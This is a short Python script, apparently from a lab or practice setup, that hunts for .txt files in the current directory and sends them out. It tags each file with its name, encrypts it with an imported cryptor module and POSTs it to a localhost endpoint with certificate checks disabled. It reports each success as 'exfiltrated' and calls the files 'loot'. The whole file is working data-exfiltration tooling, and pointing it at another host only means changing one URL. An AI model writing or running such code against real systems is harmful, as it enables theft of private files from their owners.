import requests
import os
import glob
from cryptor import encrypt


def automated_hunt():
    # 1. Target destination
    url = "https://127.0.0.1:4433/auto_sync"

    # 2. Search for all .txt files in the current folder
    print("[*] Starting automated hunt for sensitive files...")
    target_files = glob.glob("*.txt")

    if not target_files:
        print("[!] No loot found. Target directory is clean.")
        return

    requests.packages.urllib3.disable_warnings()

    for file_path in target_files:
        # Skip the loot.txt file itself to avoid a loop
        if file_path == "loot.txt":
            continue

        print(f"[*] Found: {file_path}. Encrypting...")

        with open(file_path, "rb") as f:
            file_content = f.read()

        # Add a header so the receiver knows which file this is
        labeled_data = f"FILENAME:{file_path}\nCONTENT:".encode() + file_content

        # Encrypt the entire block
        payload = encrypt(labeled_data).decode()

        try:
            response = requests.post(url, data=payload, verify=False)
            if response.status_code == 200:
                print(f"[+] {file_path} exfiltrated successfully!")
        except Exception as e:
            print(f"[!] Failed to send {file_path}: {e}")


if __name__ == '__main__':
    automated_hunt()
